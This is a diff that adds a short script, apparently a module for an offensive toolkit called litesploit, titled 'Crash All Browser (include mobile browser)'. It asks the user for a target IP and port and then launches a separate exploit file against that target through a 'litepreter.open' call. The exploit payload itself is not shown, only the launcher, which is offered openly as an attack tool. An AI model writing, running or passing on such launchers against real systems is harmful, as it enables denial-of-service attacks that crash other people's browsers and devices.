@@ -1,0 +1,13 @@
+load "litepreter"
+
+print "Crash All Browser (include mobile browser)\n"
+print "Set IP: "
+input.start()
+    @ip = input.value
+input.close()
+
+print "Set Port: "
+input.start()
+    @port = input.value
+    @result = litepreter.open(@ip, @port,"/etc/litesploit/modules/litepreter/crash/exploit.lite")
+input.close()
